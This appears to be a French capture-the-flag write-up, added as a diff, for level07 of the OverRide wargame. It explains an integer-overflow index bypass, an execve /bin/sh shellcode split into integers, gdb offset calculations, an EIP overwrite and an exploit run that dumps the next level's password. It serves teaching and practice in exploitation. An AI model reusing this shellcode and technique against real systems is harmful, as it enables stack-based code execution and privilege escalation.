@@ -1,0 +1,104 @@
+Creation du source !
+
+
+Nous pouvons executer trois commandes dans ce programme:
+	-store	: Permet de stocker un uint a l'index d'une string declaree dans le main
+	-read	: Permet de lire un uint a l'index d'une string declaree dans le main
+	-quit	: Permet de quiter xD 
+
+De plus ce progrommage fait un bzero sur l'environnement et tous les arguments.
+Lors de l'appelle de store. Le programme nous demande l'index ou ecrire et la valeur a y mettre. Mais si l'index  est un modulo 3, ou que la valeur / 0x18 est egale a 0xb7, l'ecriture ne serra pas faite. Donc on ne peut pas ecicre tous les 3 index ?? Mais si en passant par un nombre negatif 😁.
+
+Car l'index etant multiplie par deux, on garde que le 4 octets de poids faible. Donc quand on tombe sur un index %3 on utilise un nombre negatif:
+
+
+exemple:
+int min = 0
+int min + 1 = 1
+int min + 2 = 2
+.
+.
+
+On a donc creer un script qui va copier notre shellcode dans la memoire a partir de index 0 a l'index 5 inclu.
+en suivant le modele 'storage\nNUMBER\nINDEX\n....'
+
+On va utiliser les shellcode donnee par gdb: "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+
+Il faudra couper cette chaine tous les 4 octets car on peut copier seulement sizeof(int) a chaque index.
+
+>>> 0x6850c031
+1750122545
+>>> 0x68732f2f
+1752379183
+>>> 0x69622f68
+1768042344
+>>> 0x31e3896e
+836995438
+>>> 0x6aca89c9
+1791658441
+>>> 0x80cd580b
+2160941067
+
+Maintenant qu'on peut stocker notre shellcode. on va ecraser le EIP sauvgarde lors de l'arrivee dans le main.
+Nb: Etant une machine endianness... on doit couper notre shellcode 
+Donc on va calculer la difference  entre l'adresse ou est sauvgardee EIP et le debut de la string.
+
+	EIP			Debut String
+p 	0xffffdd8c 	- 	0xffffdbc4
+$6 = 0x1c8 = 456
+Donc il y a une difference de 456 octets. Mais dans le programme on se decale d'adresse 32 bits (0x4).
+456 / 4 = 114
+Donc a index 114 de notre string on va ecrire sur la sauvgarde.
+Mais 114 % 3 == 0 donc on devra ecrire a l'index -2147483648 + 114 = -2147483534.
+
+Maintenant on doit trouver l'adresse de notre string. Et le seul moyen de trouver cette adresse c est en passant par la commande read. Dans la fonction main avant l'appelle de la function read_number, l'adresse de la string est sauvgardee a esp. Donc elle est accessible 😎.
+
+Adresse ou se trouve l string sur la stack dans read_number: ebp + 0x8 (&str);
+Donc le padding est &str - *str = 0x24. Dans ebp + 0x8 on trouve l'adresse de la stack ou str est declaree. (&str)
+ p $ebp+0x8
+$8 = (void *) 0xffffdba0
+gdb-peda$ x $ebp+0x8
+0xffffdba0:	0xffffdbc4
+gdb-peda$ p 0xffffdbc4 - 0xffffdba0
+$9 = 0x24
+Etant un decallage par char on se decalle par 4 octets.
+gdb-peda$ p 0x24 / 0x4
+$10 = 0x9
+
+Donc pour lire l'adrese il faudra indiquer l'index -9.
+
+Maintenant on devrait pour l'exploiter.
+
+Lancer le script:
+	(./exploit.py ; cat -) | ./level07
+Le script va copier le shellcode dans str et lire l'adresse du debut de la stack. On va donc copier cette adresse la copier dans le champs Number, puis inscrire l'offset de EIP calcule plus haut -2147483534.
+Et enfin lancer la commande "quit" afin que l'execution arrive sur l'intruction ret afin de lancer notre shellcode.
+
+level07@OverRide:~$ (python ./exploit.py ; cat -) | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Index:  Number at data[4294967287] is 4294956356
+ Completed read command successfully
+Input command:  Number: 4294956356
+ Index: -2147483534
+ Completed store command successfully
+quit
+
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
